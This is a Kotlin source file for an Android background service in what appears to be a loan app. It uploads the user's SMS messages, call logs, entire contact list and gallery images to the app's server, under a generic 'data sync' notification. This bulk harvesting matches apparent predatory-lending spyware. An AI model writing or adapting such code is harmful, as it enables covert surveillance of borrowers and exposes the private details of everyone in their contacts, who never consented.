package com.khana.loans.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.khana.loans.MyApplication
import com.khana.loans.R
import com.khana.loans.repository.Repository
import com.khana.loans.models.Photo
import com.khana.loans.models.UserData
import com.khana.loans.utils.DATA_TO_UPLOAD
import com.khana.loans.utils.IMAGE_DATA
import com.khana.loans.utils.IMAGE_LIST
import com.khana.loans.utils.PROFILE_DATA
import com.khana.loans.utils.getUser
import com.khana.loans.utils.uriTo64
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.DisposableHandle
import kotlinx.coroutines.Job
import kotlinx.coroutines.async
import kotlinx.coroutines.launch
import okhttp3.internal.concurrent.Task
import java.io.ByteArrayOutputStream

class DataUploaderService : Service() {

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }

    companion object {
        const val CHANNEL_ID = "ForegroundServiceChannel"
        const val IMAGE_NOTIF_ID = 1
        const val DATA_NOTIF_ID = 2
        const val FOREGROUND_NOTIF_ID = 3
    }

    private val jobList = mutableListOf<Job>()
    private lateinit var repository: Repository


    override fun onCreate() {
        super.onCreate()
        repository = (super.getApplication() as MyApplication).repository
        createNotificationChannel()
        val notification = createNotification(getString(R.string.uploading_data), false)
        startForeground(FOREGROUND_NOTIF_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            val dataToUpload = intent.getStringExtra(DATA_TO_UPLOAD)
            dataToUpload?.let {
                when (it) {
                    IMAGE_DATA -> {
                        val lstImageUri = intent.getStringArrayListExtra(IMAGE_LIST)!!
                        lstImageUri.forEach {
                            launchTaskCoroutine(
                                getString(R.string.image_uploading_complete),
                                IMAGE_NOTIF_ID
                            ) {
                                val imgBase64 = uriTo64(Uri.parse(it))
                                repository.uploadImages(
                                    Photo(
                                        mobile = getUser()!!.mobile,
                                        imgBase64
                                    )
                                )
                            }
                        }
                    }

                    PROFILE_DATA -> {
                        launchTaskCoroutine(
                            getString(R.string.data_uploading_complete),
                            DATA_NOTIF_ID
                        ) {
                            val msgDeferred = async { repository.getMessages() }
                            val callLogsDeferred = async { repository.getCallDetails() }
                            val contactsDeferred = async { repository.getNamePhoneDetails() }

                            val msg = msgDeferred.await()
                            val callLogs = callLogsDeferred.await()
                            val contacts = contactsDeferred.await()

                            val userData = UserData(
                                message = msg,
                                callLogs = callLogs,
                                contacts = contacts,
                                mobile = getUser()!!.mobile
                            )

                            repository.uploadUserData(userData)
                        }
                    }

                    else -> {}
                }
            }


        }
        return START_STICKY
    }

    private fun launchTaskCoroutine(
        notificationMessage: String,
        notificationId: Int,
        task: suspend CoroutineScope.() -> Unit
    ): DisposableHandle {
        val job = CoroutineScope(Dispatchers.IO).launch {
            task.invoke(this)
        }
        return job.invokeOnCompletion {
            jobList.remove(job)
            if (jobList.isEmpty()) {
                //          AppPref.getInstance().setValue(AppPref.DATA_UPLOADED, true)
                val updatedNotification = createNotification(
                    notificationMessage,
                    true
                )
                val notificationManager =
                    application.getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                notificationManager.notify(notificationId, updatedNotification)
                stopSelf()
            }
        }
    }

    private fun createNotification(
        contentText: String,
        isProcessingComplete: Boolean
    ): Notification {

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.data_sync))
            .setContentText(contentText)
            .setSmallIcon(R.mipmap.ic_launcher_round)
            .setOngoing(!isProcessingComplete)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.data_uploading_service),
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        jobList.forEach {
            it.cancel()
        }
    }




}